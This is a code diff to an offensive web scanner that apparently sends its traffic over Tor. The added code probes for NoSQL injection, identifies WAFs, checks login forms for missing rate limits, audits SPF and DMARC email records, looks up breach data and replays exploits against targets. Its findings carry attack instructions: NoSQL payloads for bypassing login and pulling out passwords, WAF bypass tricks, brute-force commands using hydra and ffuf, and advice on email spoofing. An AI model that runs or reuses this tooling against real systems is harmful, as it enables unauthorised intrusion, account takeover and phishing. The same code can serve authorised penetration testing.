+        Node/Express with qs enabled — and is NOT injection.
+        """
+        findings = []
+        test_params = self._get_test_params(["id", "user", "username", "email",
+                                              "name", "search", "q"])
+        for param in test_params[:5]:
+            if shutdown_requested():
+                break
+
+            bogus = f"x{secrets.token_hex(3)}"
+            base_url_no_q = base_url.split("?")[0]
+
+            # (a) Bogus scalar — 'does not exist'
+            url_a = f"{base_url_no_q}?{param}={bogus}"
+            # (b) Real-ish scalar — 'does exist' most of the time
+            url_b = f"{base_url_no_q}?{param}=1"
+            # (c) [$ne] operator — MongoDB: match everything except bogus
+            url_c = f"{base_url_no_q}?{param}[$ne]={bogus}"
+
+            r_a = self._session.get(url_a, allow_wayback=False)
+            if not r_a or not r_a.text:
+                continue
+            r_b = self._session.get(url_b, allow_wayback=False)
+            r_c = self._session.get(url_c, allow_wayback=False)
+            if not r_c or not r_c.text:
+                continue
+
+            body_a = r_a.text[:6000]
+            body_c = r_c.text[:6000]
+            len_a = len(r_a.text)
+            len_b = len(r_b.text) if r_b and r_b.text else 0
+            len_c = len(r_c.text)
+
+            # Signal 1: MongoDB-class error ONLY in the [$ne] response
+            # (not in the bogus baseline → rules out generic 500s that
+            # a badly-written param handler always emits).
+            for ind in self.NOSQL_INDICATORS:
+                if ind.search(body_c) and not ind.search(body_a):
+                    findings.append({
+                        "severity": SEV_CRITICAL,
+                        "title": f"NoSQL injection error via '{param}'",
+                        "detail": ("MongoDB-class error appeared only in "
+                                   "response to a [$ne] payload. Input "
+                                   "reaches a NoSQL query without "
+                                   "sanitization."),
+                        "evidence": f"param: {param}, pattern: {ind.pattern[:60]}",
+                        "exploitable": True,
+                        "test_url": url_c,
+                        "exploit_info": {
+                            "type": "nosql_injection",
+                            "parameter": param,
+                            "method": ("Use operators that coerce to "
+                                       "'true' for every document: "
+                                       "?user[$ne]=0&pass[$ne]=0 to "
+                                       "bypass auth. For data "
+                                       "extraction: [$regex]=.*"),
+                            "risk": "Auth bypass, data exfiltration, DB enumeration",
+                        },
+                    })
+                    return findings
+
+            # Signal 2: Three-point boolean differential.
+            # Only flag if (c) is BOTH:
+            #   - meaningfully larger than (a) AND
+            #   - different enough from (b) to look like 'more than
+            #     one match' (not just the same match rendered twice)
+            if r_c.status_code == 200 and len_c > len_a + 1024:
+                # If the baseline-plain is similar to (c), then the app
+                # just treats [$ne] like the plain param; that's not
+                # injection.
+                plain_matches_ne = (
+                    len_b > 0 and
+                    abs(len_c - len_b) < max(512, len_b * 0.1)
+                )
+                # If (a) was a hard error (4xx) and (c) was 200, that's
+                # a very strong signal regardless of length.
+                a_was_error = r_a.status_code in (400, 404)
+                if a_was_error and r_c.status_code == 200:
+                    findings.append({
+                        "severity": SEV_HIGH,
+                        "title": f"Possible NoSQL injection via '{param}' (404→200)",
+                        "detail": (f"?{param}=<bogus> → HTTP {r_a.status_code} "
+                                   f"but ?{param}[$ne]=<bogus> → HTTP 200. "
+                                   f"Operator was interpreted by the DB."),
+                        "evidence": f"baseline={r_a.status_code}, $ne={r_c.status_code}",
+                        "exploitable": True,
+                        "test_url": url_c,
+                        "exploit_info": {
+                            "type": "nosql_injection",
+                            "parameter": param,
+                            "method": ("Swap the parameter for "
+                                       "[$ne]/[$gt]/[$regex] — most "
+                                       "endpoints will leak everything."),
+                            "risk": "Auth bypass, data extraction",
+                        },
+                    })
+                    return findings
+                if not plain_matches_ne:
+                    findings.append({
+                        "severity": SEV_HIGH,
+                        "title": f"Possible NoSQL injection via '{param}' (length diff)",
+                        "detail": (f"[$ne] payload returned {len_c} bytes "
+                                   f"vs {len_a}-byte bogus baseline "
+                                   f"(and {len_b}-byte plain baseline) — "
+                                   f"response differs from both, "
+                                   f"consistent with match-everything."),
+                        "evidence": (f"bogus={len_a}B, plain={len_b}B, "
+                                     f"$ne={len_c}B"),
+                        "exploitable": True,
+                        "test_url": url_c,
+                        "exploit_info": {
+                            "type": "nosql_injection",
+                            "parameter": param,
+                            "method": ("Data extraction: "
+                                       "?user=admin&pass[$regex]=^a.* "
+                                       "leaks the password one character "
+                                       "at a time."),
+                            "risk": "Auth bypass, credential extraction",
+                        },
+                    })
+                    return findings
+        return findings
+
+    # Common WAF/IPS fingerprints by response headers and body signatures.
+    # Value is (Short name, detail).
+    # Header-only WAF fingerprints. Every entry is an EXACT
+    # response-header name that — on its own, regardless of value —
+    # proves a specific WAF / CDN is in the path. Header names that
+    # are generic (x-request-id, server, x-powered-by) are NOT here;
+    # we match those by value via _WAF_SERVER_VALUE_FINGERPRINTS.
+    _WAF_HEADER_FINGERPRINTS = {
+        "cf-ray":               "Cloudflare",
+        "cf-cache-status":      "Cloudflare",
+        "x-sucuri-id":          "Sucuri CloudProxy",
+        "x-sucuri-cache":       "Sucuri CloudProxy",
+        "x-iinfo":              "Imperva Incapsula",
+        "x-cdn":                "Imperva Incapsula",
+        "x-amz-cf-id":          "AWS CloudFront",
+        "x-amz-cf-pop":         "AWS CloudFront",
+        "x-amzn-trace-id":      "AWS ALB",
+        "x-amzn-requestid":     "AWS (API Gateway / Lambda)",
+        "x-citrix-session-id":  "Citrix NetScaler",
+        "x-waf-event-info":     "FortiGate",
+        "x-waf-status":         "Generic WAF (unnamed vendor)",
+        "x-dcid":               "Yundun / DDoS-GUARD",
+        "x-bigip-selfip":       "F5 BIG-IP",
+        "x-bigip-ltm":          "F5 BIG-IP",
+        "x-fireeye":            "FireEye NX",
+        "x-barracuda":          "Barracuda WAF",
+        "x-varnish":            "Varnish cache",
+        "x-cloud-trace-context": "Google Cloud",
+        "x-azure-ref":          "Azure Front Door",
+        "x-azure-clientip":     "Azure WAF",
+    }
+
+    # Server-header value matches — we look inside the 'server:' value
+    # for a substring. server: cloudflare is a real fingerprint,
+    # server: nginx is not (nginx is an http server, not a WAF).
+    _WAF_SERVER_VALUE_FINGERPRINTS = [
+        ("cloudflare",  "Cloudflare"),
+        ("cloudfront",  "AWS CloudFront"),
+        ("bigip",       "F5 BIG-IP"),
+        ("big-ip",      "F5 BIG-IP"),
+        ("awselb",      "AWS ELB/ALB"),
+        ("awsalb",      "AWS ELB/ALB"),
+        ("akamaighost", "Akamai"),
+        ("akamai",      "Akamai"),
+        ("sucuri",      "Sucuri CloudProxy"),
+        ("barracuda",   "Barracuda WAF"),
+        ("imperva",     "Imperva Incapsula"),
+        ("incapsula",   "Imperva Incapsula"),
+        ("fortiweb",    "FortiWeb WAF"),
+    ]
+
+    _WAF_BODY_SIGNATURES = [
+        (re.compile(r"<title>Access denied.*Sucuri", re.I), "Sucuri CloudProxy"),
+        (re.compile(r"Cloudflare Ray ID:", re.I),            "Cloudflare"),
+        (re.compile(r"attention required!.*cloudflare", re.I), "Cloudflare"),
+        (re.compile(r"Incapsula incident ID", re.I),         "Imperva Incapsula"),
+        (re.compile(r"Request\s+unsuccessful\.\s*Incapsula"), "Imperva Incapsula"),
+        (re.compile(r"Reference\s*#\d+\.\w+\."),              "Akamai"),
+        (re.compile(r"AkamaiGHost", re.I),                    "Akamai"),
+        (re.compile(r"blocked.*Barracuda", re.I),             "Barracuda WAF"),
+        (re.compile(r"<TITLE>Web Page Blocked!</TITLE>", re.I), "Palo Alto"),
+        (re.compile(r"FortiGate web filtering", re.I),        "FortiGate"),
+        (re.compile(r"/waf_block\.html", re.I),               "SafeDog"),
+        (re.compile(r"\bModSecurity\b", re.I),                "ModSecurity"),
+    ]
+
+    def _check_waf_fingerprint(self, base_url: str, html: str,
+                               headers: dict) -> List[dict]:
+        """Identify the WAF / CDN fronting the target.
+
+        Not a vulnerability per se, but a massively useful INFO-class
+        finding — every subsequent bypass technique depends on which
+        WAF you're up against. Emitted early so the walkthrough can
+        tailor its payload mutation.
+
+        We deliberately do NOT flag 'WAF detected' based on generic
+        headers like 'server: nginx' — nginx is an http server, not a
+        WAF. Only signals that uniquely identify a WAF/CDN count.
+        """
+        findings = []
+        h_lower = {k.lower(): v for k, v in headers.items()}
+        seen_names: Set[str] = set()
+
+        # Exact-header-name fingerprints
+        for hname, waf in self._WAF_HEADER_FINGERPRINTS.items():
+            if hname in h_lower:
+                seen_names.add(waf)
+
+        # Server-header value fingerprints (substring match on the value)
+        server_val = h_lower.get("server", "").lower()
+        via_val = h_lower.get("via", "").lower()
+        combined_id = f"{server_val} | {via_val}"
+        for needle, waf in self._WAF_SERVER_VALUE_FINGERPRINTS:
+            if needle in combined_id:
+                seen_names.add(waf)
+
+        # Body signatures — only bother scanning when the page looked
+        # like a block page (low byte count AND/OR common block words)
+        # so we don't flag 'ModSecurity' on a page that documents it.
+        body_scan = html[:10000] if html else ""
+        if body_scan:
+            lower_head = body_scan[:2000].lower()
+            block_like = (
+                len(body_scan) < 8000 and
+                any(w in lower_head for w in
+                    ("blocked", "forbidden", "access denied",
+                     "ray id", "incident id", "attention required",
+                     "reference #", "request unsuccessful"))
+            )
+            if block_like:
+                for pat, waf in self._WAF_BODY_SIGNATURES:
+                    if pat.search(body_scan):
+                        seen_names.add(waf)
+
+        if seen_names:
+            names_s = ", ".join(sorted(seen_names))
+            findings.append({
+                "severity": SEV_INFO,
+                "title": f"WAF / CDN detected: {names_s}",
+                "detail": (f"Target is fronted by {names_s}. Payload "
+                           f"mutations (case-flip, inline comments, "
+                           f"whitespace substitution) may be required."),
+                "evidence": f"Detected via: {names_s}",
+                "exploit_info": {
+                    "type": "waf_fingerprint",
+                    "waf": names_s,
+                    "method": ("Use WAF-specific bypass catalogs. "
+                               "Cloudflare: IP-direct origin, X-Originating-IP "
+                               "trust. Imperva: HTTP/2 smuggling. "
+                               "F5: oversized cookie/header tricks. "
+                               "Akamai: cache-poisoning + pragma-cache."),
+                    "risk": "Bypass depends on which WAF is in the path",
+                },
+            })
+        return findings
+
+    def _check_login_forms(self, base_url: str, html: str) -> List[dict]:
+        """Detect authentication forms + test whether they rate-limit.
+
+        Signals:
+        1. Form exists with <input type="password"> — INFO finding,
+           captures the field names / hidden-token fields so the
+           walkthrough can build a hydra-friendly brute-force command.
+        2. 4 consecutive wrong-password POSTs (with a clearly-fake
+           throwaway username) all return the same status + near-
+           identical body length and no 429 — MEDIUM
+           'brute_force_viable' finding.
+
+        The throwaway username is 'gsprobe<hex>notareal' so no real
+        account can ever get locked by the probe. The probe loop
+        stops early on 429.
+        """
+        findings = []
+        if not HAS_BS4 or not html:
+            return findings
+        domain = urlparse(base_url).netloc
+        if self._session.is_domain_blocked(domain):
+            return findings
+
+        try:
+            soup = BeautifulSoup(html[:200000], "html.parser")
+        except Exception:
+            return findings
+
+        # Find forms containing a password input.
+        login_forms: List[dict] = []
+        for form in soup.find_all("form"):
+            pwd_inputs = form.find_all("input", attrs={"type": "password"})
+            if not pwd_inputs:
+                continue
+            action = form.get("action", "") or ""
+            method = (form.get("method", "POST") or "POST").upper()
+            form_url = urljoin(base_url, action) if action else base_url
+            if urlparse(form_url).netloc != domain:
+                continue
+            # Identify username / password field names
+            uname_field = None
+            pwd_field = None
+            for inp in form.find_all("input"):
+                name = inp.get("name", "")
+                itype = (inp.get("type", "text") or "text").lower()
+                if not name:
+                    continue
+                if itype == "password" and not pwd_field:
+                    pwd_field = name
+                elif (itype in ("text", "email") or
+                      name.lower() in ("user", "username", "email", "login",
+                                       "account", "userid")) and not uname_field:
+                    uname_field = name
+            if not pwd_field:
+                continue
+            login_forms.append({
+                "url": form_url,
+                "method": method,
+                "username_field": uname_field or "username",
+                "password_field": pwd_field,
+                "hidden_fields": {
+                    (inp.get("name") or ""): (inp.get("value") or "")
+                    for inp in form.find_all("input", attrs={"type": "hidden"})
+                    if inp.get("name")
+                },
+            })
+
+        if not login_forms:
+            return findings
+
+        login_form = login_forms[0]
+        path_disp = urlparse(login_form['url']).path or '/'
+        findings.append({
+            "severity": SEV_INFO,
+            "title": f"Login form at {path_disp}",
+            "detail": (f"Login form discovered — "
+                       f"user={login_form['username_field']} / "
+                       f"pass={login_form['password_field']}. "
+                       f"Useful as a brute-force target if no rate limit."),
+            "evidence": (f"{login_form['method']} "
+                         f"{login_form['url']} with "
+                         f"{len(login_form['hidden_fields'])} hidden field(s)"),
+            "confidence": 0.95,
+            "exploit_info": {
+                "type": "login_form",
+                "path": path_disp,
+                "username_field": login_form["username_field"],
+                "password_field": login_form["password_field"],
+                "hidden_fields": list(login_form["hidden_fields"].keys()),
+            },
+        })
+
+        # Probe rate limiting — 4 rapid-fire wrong-password POSTs with
+        # a distinctive-looking throwaway username (clearly fake so no
+        # human account gets locked). We compare status codes + body
+        # lengths. If EVERY request returns the same code and a similar
+        # length, and no 429 shows up, we flag brute-force-friendly.
+        # Previously we did 6 probes + an "admin" enumeration probe;
+        # the admin probe risked locking a real account on a
+        # lockout-after-N-attempts policy, so it's gone.
+        # If the username field is named "email" (or similar), use an
+        # email-shaped throwaway so apps that reject non-email input
+        # don't short-circuit the rate-limit probe on syntax validation
+        # before the login logic even runs.
+        _uname_field = login_form["username_field"].lower()
+        if "email" in _uname_field or "mail" in _uname_field:
+            throwaway_user = f"gsprobe{secrets.token_hex(4)}@notareal.test"
+        else:
+            throwaway_user = f"gsprobe{secrets.token_hex(4)}notareal"
+        statuses: List[int] = []
+        lengths: List[int] = []
+        for _ in range(4):
+            if shutdown_requested() or self._session.is_domain_blocked(domain):
+                break
+            data = {
+                login_form["username_field"]: throwaway_user,
+                login_form["password_field"]: secrets.token_hex(6),
+            }
+            data.update(login_form["hidden_fields"])
+            # post_form already honors the block/delay machinery.
+            resp = self._session.post_form(
+                login_form["url"], data, allow_redirects=False,
+            )
+            if resp is None:
+                break
+            statuses.append(resp.status_code)
+            lengths.append(len(resp.text or ""))
+            # If the site just returned a Retry-After or 429 on any
+            # request, rate limiting is present — stop probing.
+            if resp.status_code == 429:
+                break
+
+        if len(statuses) >= 3 and 429 not in statuses:
+            # Tight window on body-length jitter: 5% variance is normal
+            # (CSRF token changes, random ad slots), more than that
+            # means the server's responses aren't uniform.
+            avg_len = sum(lengths) / len(lengths) if lengths else 0
+            max_dev = (max(abs(l - avg_len) for l in lengths)
+                       if lengths and avg_len else 0)
+            uniform_len = avg_len > 0 and max_dev <= max(100, avg_len * 0.05)
+            same_status = len(set(statuses)) == 1
+
+            if same_status and uniform_len:
+                findings.append({
+                    "severity": SEV_MEDIUM,
+                    "title": "Login form lacks rate limiting",
+                    "detail": (f"{len(statuses)} failed-login attempts all "
+                               f"returned HTTP {statuses[0]} with a near-"
+                               f"identical body length (avg={avg_len:.0f}B, "
+                               f"max dev={max_dev:.0f}B). No 429, no "
+                               f"progressive slowdown. Brute-force is "
+                               f"practical when you have a username list."),
+                    "evidence": f"statuses: {statuses}, lengths: {lengths}",
+                    "confidence": 0.85,
+                    "exploitable": True,
+                    "exploit_info": {
+                        "type": "brute_force_viable",
+                        "path": path_disp,
+                        "username_field": login_form["username_field"],
+                        "password_field": login_form["password_field"],
+                        "method": (f"POST {login_form['url']} with "
+                                   f"{login_form['username_field']}=<target> "
+                                   f"and {login_form['password_field']}="
+                                   f"<wordlist>. Use hydra / ffuf / "
+                                   f"Turbo Intruder."),
+                        "risk": "Account takeover via brute-force",
+                    },
+                })
+
         return findings
 
     def _check_ssl_cert(self, base_url: str) -> List[dict]:
@@ -3369,10 +5031,18 @@ class SubdomainEnumerator:
                 name = entry.get("name_value", "")
                 for line in name.split("\n"):
                     line = line.strip().lower()
-                    if line and (line.endswith(f".{domain}") or line == domain):
-                        # Remove wildcard prefix
-                        line = line.lstrip("*.")
-                        if line and re.match(r"^[a-z0-9.\-]+$", line):
+                    if not line:
+                        continue
+                    # Strip the exact '*.' wildcard prefix. Using
+                    # str.lstrip('*.') treated the argument as a
+                    # character set and also stripped legitimate leading
+                    # dots/stars — so '*foo.example.com' (no dot after
+                    # the asterisk) became 'foo.example.com', which
+                    # isn't actually the same host.
+                    if line.startswith("*."):
+                        line = line[2:]
+                    if line.endswith(f".{domain}") or line == domain:
+                        if re.match(r"^[a-z0-9.\-]+$", line):
                             subdomains.add(line)
         except (ValueError, KeyError):
             pass
@@ -3391,13 +5061,20 @@ class DNSRecon:
     """
 
     DOH_URL = "https://cloudflare-dns.com/dns-query"
-    RECORD_TYPES = ["A", "AAAA", "MX", "TXT", "NS", "CNAME", "SOA"]
+    RECORD_TYPES = ["A", "AAAA", "MX", "TXT", "NS", "CNAME", "SOA", "CAA", "DNSKEY"]
+
+    # ── Email-spoofing posture ──────────────────────────────────────
+    # SPF / DMARC / DKIM aren't "vulnerabilities" in the scanner sense,
+    # but a missing / weak SPF or DMARC is directly exploitable: it
+    # lets an attacker send forged email from the target's domain. We
+    # surface findings so they land in the same report as the web
+    # vulns.
 
     def __init__(self, session: TorSession):
         self._session = session
 
     def lookup(self, domain: str) -> Dict[str, List[str]]:
-        """Query multiple DNS record types for a domain."""
+        """Query multiple DNS record types for a domain + _dmarc subdomain."""
         results = {}
         for rtype in self.RECORD_TYPES:
             if shutdown_requested():
@@ -3405,7 +5082,178 @@ class DNSRecon:
             records = self._query(domain, rtype)
             if records:
                 results[rtype] = records
+
+        # DMARC lives at _dmarc.<domain> as a TXT record. Query
+        # separately so the main results dict keeps its
+        # by-record-type structure for the printer.
+        if not shutdown_requested():
+            dmarc_records = self._query(f"_dmarc.{domain}", "TXT")
+            if dmarc_records:
+                results["DMARC"] = dmarc_records
         return results
+
+    def analyze_email_posture(self, records: Dict[str, List[str]],
+                               domain: str = "") -> List[dict]:
+        """Produce vuln-shaped findings for SPF / DMARC weaknesses.
+
+        Maps the raw records to the exact same finding dict shape the
+        VulnScanner emits so the orchestrator can render them alongside
+        the web findings without special casing.
+        """
+        findings: List[dict] = []
+
+        txt_records = records.get("TXT", []) or []
+        dmarc_records = records.get("DMARC", []) or []
+        mx_records = records.get("MX", []) or []
+
+        # ── SPF ────────────────────────────────────────────────────
+        spf = [t for t in txt_records if t.lower().lstrip().startswith("v=spf1")]
+        if not spf:
+            # Domains that accept mail (MX set) without SPF are particularly bad.
+            sev = SEV_MEDIUM if mx_records else SEV_LOW
+            findings.append({
+                "severity": sev,
+                "title": "Missing SPF record",
+                "detail": ("No v=spf1 TXT record. Anyone on the public "
+                           "internet can send email claiming to be from "
+                           "this domain without tripping receiver checks."),
+                "evidence": "No TXT record starting with 'v=spf1'",
+                "exploit_info": {
+                    "type": "email_spoof",
+                    "method": ("Send forged email with the target's "
+                               "domain in From:. No SPF means receivers "
+                               "have no basis to reject it."),
+                    "risk": "Phishing under the target's name",
+                },
+                "exploitable": True,
+            })
+        else:
+            spf_val = spf[0].lower()
+            # SPF terminator: -all = hardfail, ~all = softfail, ?all = neutral, +all = allow-any
+            if " +all" in spf_val or spf_val.endswith("+all"):
+                findings.append({
+                    "severity": SEV_HIGH,
+                    "title": "SPF record allows any sender (+all)",
+                    "detail": ("The SPF record ends with +all, which "
+                               "explicitly allows ANY IP to send email "
+                               "as this domain. Equivalent to no SPF."),
+                    "evidence": spf[0][:200],
+                    "exploit_info": {
+                        "type": "email_spoof",
+                        "method": "Send forged email — SPF passes regardless of source IP.",
+                        "risk": "Phishing under the target's name",
+                    },
+                    "exploitable": True,
+                })
+            elif " ?all" in spf_val or spf_val.endswith("?all"):
+                findings.append({
+                    "severity": SEV_MEDIUM,
+                    "title": "SPF record ends with ?all (neutral)",
+                    "detail": ("The SPF ends with ?all (neutral). "
+                               "Receivers treat unlisted senders as "
+                               "undefined, and most accept the mail."),
+                    "evidence": spf[0][:200],
+                    "exploitable": True,
+                    "exploit_info": {
+                        "type": "email_spoof",
+                        "method": "Send forged email — SPF neutral is widely treated as pass.",
+                        "risk": "Phishing under the target's name",
+                    },
+                })
+            elif " ~all" in spf_val or spf_val.endswith("~all"):
+                findings.append({
+                    "severity": SEV_LOW,
+                    "title": "SPF record uses ~all (softfail)",
+                    "detail": ("The SPF ends with ~all (softfail). "
+                               "Mail still gets delivered — usually to "
+                               "spam, but delivered. Consider -all for "
+                               "hardfail."),
+                    "evidence": spf[0][:200],
+                })
+            # SPF lookup-explosion (RFC 7208 bans >10 DNS lookups)
+            lookup_tokens = spf_val.count("include:") + spf_val.count("a:") + \
+                spf_val.count("mx:") + spf_val.count("ptr:") + \
+                spf_val.count("exists:") + spf_val.count("redirect=")
+            if lookup_tokens > 10:
+                findings.append({
+                    "severity": SEV_MEDIUM,
+                    "title": "SPF record exceeds 10-DNS-lookup limit",
+                    "detail": (f"SPF uses {lookup_tokens} DNS-lookup "
+                               f"mechanisms (include:, a:, mx:, ptr:, "
+                               f"exists:, redirect=). RFC 7208 caps at "
+                               f"10; receivers return PermError, which "
+                               f"most treat as SPF fail ≡ no SPF."),
+                    "evidence": f"{lookup_tokens} lookups in SPF",
+                })
+
+        # ── DMARC ─────────────────────────────────────────────────
+        dmarc = [t for t in dmarc_records if t.lower().lstrip().startswith("v=dmarc1")]
+        if not dmarc:
+            sev = SEV_MEDIUM if mx_records or spf else SEV_LOW
+            findings.append({
+                "severity": sev,
+                "title": "Missing DMARC record",
+                "detail": ("No DMARC record at _dmarc.<domain>. Even if "
+                           "SPF is configured, receivers have no "
+                           "aligned policy to apply, so forged mail "
+                           "often passes."),
+                "evidence": f"No v=dmarc1 TXT at _dmarc.{domain or '<target>'}",
+                "exploit_info": {
+                    "type": "email_spoof",
+                    "method": ("Mismatched From: / Return-Path: passes "
+                               "SPF but fails DMARC alignment — with no "
+                               "DMARC policy, receivers accept it."),
+                    "risk": "Phishing with realistic From: line",
+                },
+                "exploitable": True,
+            })
+        else:
+            dmarc_val = dmarc[0].lower()
+            # DMARC policy: p=none (monitor only), p=quarantine, p=reject.
+            if "p=none" in dmarc_val:
+                findings.append({
+                    "severity": SEV_LOW,
+                    "title": "DMARC policy is p=none (monitor only)",
+                    "detail": ("DMARC is configured but set to p=none, "
+                               "which tells receivers to accept "
+                               "failing mail and only report it. No "
+                               "protection against spoofing."),
+                    "evidence": dmarc[0][:200],
+                    "exploitable": True,
+                    "exploit_info": {
+                        "type": "email_spoof",
+                        "method": "Spoof freely — DMARC failures are reported, not rejected.",
+                        "risk": "Phishing under the target's name",
+                    },
+                })
+            if "pct=" in dmarc_val:
+                m = re.search(r"pct=(\d+)", dmarc_val)
+                if m:
+                    pct = int(m.group(1))
+                    if 0 < pct < 100:
+                        findings.append({
+                            "severity": SEV_LOW,
+                            "title": f"DMARC pct={pct} (partial enforcement)",
+                            "detail": (f"Only {pct}% of failing mail is "
+                                       f"enforced. The other {100-pct}% "
+                                       f"slips through regardless of "
+                                       f"the p= policy."),
+                            "evidence": dmarc[0][:200],
+                        })
+
+        # ── DNSSEC ────────────────────────────────────────────────
+        if not records.get("DNSKEY"):
+            # Informational only — most domains don't deploy DNSSEC.
+            findings.append({
+                "severity": SEV_INFO,
+                "title": "DNSSEC not deployed",
+                "detail": ("No DNSKEY records returned. Zone is "
+                           "vulnerable to cache-poisoning / on-path DNS "
+                           "attacks. Not a web vulnerability per se."),
+                "evidence": "No DNSKEY records",
+            })
+
+        return findings
 
     def _query(self, domain: str, rtype: str) -> List[str]:
         """Single DNS-over-HTTPS query."""
@@ -3496,11 +5344,20 @@ class BreachChecker:
         return None
 
     def check_dehashed(self, email: str) -> Optional[dict]:
+        # DeHashed's /search endpoint requires HTTP Basic auth with the
+        # account email as the username and the API key as the password.
+        # Without this, every request comes back 401 and the check is a
+        # silent no-op. Both values are read from DEHASHED_EMAIL /
+        # DEHASHED_KEY at module load.
         if not DEHASHED_API_KEY or not DEHASHED_EMAIL:
             return None
         url = f"https://api.dehashed.com/search?query=email:{quote(email)}"
-        resp = self._session.get(url, allow_wayback=False,
-                                 headers={"Accept": "application/json"})
+        resp = self._session.get(
+            url,
+            allow_wayback=False,
+            headers={"Accept": "application/json"},
+            auth=(DEHASHED_EMAIL, DEHASHED_API_KEY),
+        )
         if resp and resp.status_code == 200:
             try:
                 data = resp.json()
@@ -3686,10 +5543,17 @@ class CapturedRequest:
 
 
 class RequestLog:
-    """Thread-safe log of captured requests for a scan session."""
+    """Thread-safe log of captured requests for a scan session.
+
+    The class advertises thread safety because consumers (ExploitVerifier,
+    FindingChain, PoCExporter) reach into the list from different call
+    sites and concurrency could grow later. A threading.Lock around every
+    list mutation / iteration is cheap and makes the contract honest.
+    """
 
     def __init__(self):
         self._requests: List[CapturedRequest] = []
+        self._lock = threading.Lock()
 
     def capture(self, method: str, url: str, headers: dict, body: str,
                 resp: Optional[requests.Response]) -> CapturedRequest:
@@ -3700,17 +5564,21 @@ class RequestLog:
             resp_headers=dict(resp.headers) if resp else {},
             resp_body=resp.text[:50000] if resp else "",
         )
-        self._requests.append(cr)
+        with self._lock:
+            self._requests.append(cr)
         return cr
 
     def get_for_url(self, url: str) -> List[CapturedRequest]:
-        return [r for r in self._requests if r.url == url]
+        with self._lock:
+            return [r for r in self._requests if r.url == url]
 
     def get_all(self) -> List[CapturedRequest]:
-        return list(self._requests)
+        with self._lock:
+            return list(self._requests)
 
     def clear(self):
-        self._requests.clear()
+        with self._lock:
+            self._requests.clear()
 
 
 # ══════════════════════════════════════════════════════════════════════════
@@ -3761,11 +5629,9 @@ class ExploitVerifier:
         # Execute replay
         try:
             if exploit_type == "graphql_introspection":
-                resp = self._session._session.post(
+                resp = self._session.post_json(
                     replay_url,
-                    json={"query": "{ __schema { types { name } } }"},
-                    timeout=15, proxies=self._session._proxy,
-                    headers=_pick_profile(),
+                    {"query": "{ __schema { types { name } } }"},
                 )
             else:
                 resp = self._session.get(replay_url, allow_wayback=False)
@@ -3863,30 +5729,90 @@ class ExploitVerifier:
                 return True
 
         elif exploit_type == "subdomain_takeover":
-            # Use the service fingerprint from the original finding for verification
+            # Look up the fingerprint from the same class-level table
+            # the scanner uses. Previously maintained a separate
+            # hand-copied subset that drifted behind the scanner.
             ei = finding.get("exploit_info", {})
             service = ei.get("service", "")
-            takeover_fingerprints = {
-                "GitHub Pages": "there isn't a github pages site here",
-                "Heroku": "no-such-app",
-                "AWS S3": "nosuchbucket",
-                "Shopify": "sorry, this shop is currently unavailable",
-                "Fastly": "fastly error: unknown domain",
-            }
-            fp = takeover_fingerprints.get(service, "")
-            if fp and fp in text.lower():
+            service_fp = None
+            for _svc_domain, (_name, fp) in VulnScanner.TAKEOVER_FINGERPRINTS.items():
+                if _name == service:
+                    service_fp = fp
+                    break
+            if service_fp and service_fp in text.lower():
                 return True
             return False
+
+        elif exploit_type == "nosql_injection":
+            # Re-look for NoSQL indicators in the replay body.
+            body_preview = text
+            for pat in VulnScanner.NOSQL_INDICATORS:
+                if pat.search(body_preview):
+                    return True
+            return False
+
+        elif exploit_type == "host_header_injection":
+            # Replay with a unique marker Host header. If the new
+            # marker shows up in the Location or body it's the same
+            # bug, confirmed.
+            import secrets as _secrets
+            marker = f"vx{_secrets.token_hex(4)}.example.test"
+            ei = finding.get("exploit_info", {})
+            hname = ei.get("header", "Host")
+            url = finding.get("test_url", "")
+            if not url:
+                return False
+            r2 = self._session.request(
+                "GET", url, allow_redirects=False,
+                extra_headers={hname: marker},
+            )
+            if r2 is None:
+                return False
+            loc = r2.headers.get("Location", "")
+            if loc and marker in loc:
+                return True
+            if r2.text and marker in r2.text:
+                return True
+            return False
+
+        elif exploit_type == "http_verb_tampering":
+            # Replay with the alternate verb inferred from the evidence.
+            ei = finding.get("exploit_info", {})
+            url = finding.get("test_url", "")
+            if not url:
+                return False
+            # Pull the alternate verb out of the evidence string:
+            #   "GET→403, PUT→200"  →  verb = PUT
+            ev = finding.get("evidence", "")
+            verb_match = re.search(r",\s*([A-Z]+)→", ev)
+            verb = verb_match.group(1) if verb_match else "POST"
+            r2 = self._session.request(
+                verb, url, allow_redirects=False,
+            )
+            return bool(r2) and 200 <= r2.status_code < 300
 
         elif exploit_type == "directory_traversal":
             if re.search(r"root:.*:0:0:", text):
                 return True
 
         elif exploit_type == "open_redirect":
-            if resp.status_code in (301, 302, 303, 307, 308):
-                location = resp.headers.get("Location", "")
+            # TorSession.get follows redirects by default, so a replay
+            # through it would resolve to the target of the redirect
+            # and we'd never see the Location header. Use the session's
+            # request() method with allow_redirects=False.
+            evil_target = "evil-attacker.com"
+            url = finding.get("test_url", "")
+            if not url:
+                return False
+            resp_nr = self._session.request(
+                "GET", url, allow_redirects=False,
+            )
+            if resp_nr is None:
+                return False
+            if resp_nr.status_code in (301, 302, 303, 307, 308):
+                location = resp_nr.headers.get("Location", "")
                 loc_host = urlparse(location).netloc
-                return loc_host != "" and loc_host != urlparse(resp.url).netloc
+                return bool(loc_host) and evil_target in loc_host
             return False
 
         return False
@@ -4232,9 +6158,14 @@ class FindingChain:
                        tech: dict) -> List[dict]:
         """Process chain rules against existing findings.
 
-        Returns NEW findings discovered through chaining.
+        Returns NEW findings discovered through chaining. Each action
+        runs at most once per invocation — the old code could launch
+        _wp_deep_scan twice (once via CHAIN_RULES trigger, once via
+        the tech fingerprint fallback), producing duplicate findings
+        and double the requests to the target.
         """
         new_findings = []
+        actions_run: Set[str] = set()
 
         for rule in self.CHAIN_RULES:
             triggered = [f for f in findings if rule["trigger"](f)]
@@ -4242,6 +6173,9 @@ class FindingChain:
                 continue
 
             action = rule["action"]
+            if action in actions_run:
+                continue
+            actions_run.add(action)
             integrity_log("intel", f"chain_triggered:{action}")
 
             if action == "wordpress_deep_scan":
@@ -4251,10 +6185,12 @@ class FindingChain:
             elif action == "graphql_enum":
                 new_findings.extend(self._graphql_enum(base_url, triggered[0]))
 
-        # Also chain based on tech fingerprint
-        if "WordPress" in tech.get("cms", []):
-            wp_findings = self._wp_deep_scan(base_url)
-            new_findings.extend(wp_findings)
+        # Also chain based on tech fingerprint, but don't repeat work.
+        if "WordPress" in tech.get("cms", []) and \
+                "wordpress_deep_scan" not in actions_run:
+            actions_run.add("wordpress_deep_scan")
+            integrity_log("intel", "chain_triggered:wordpress_deep_scan:via_tech")
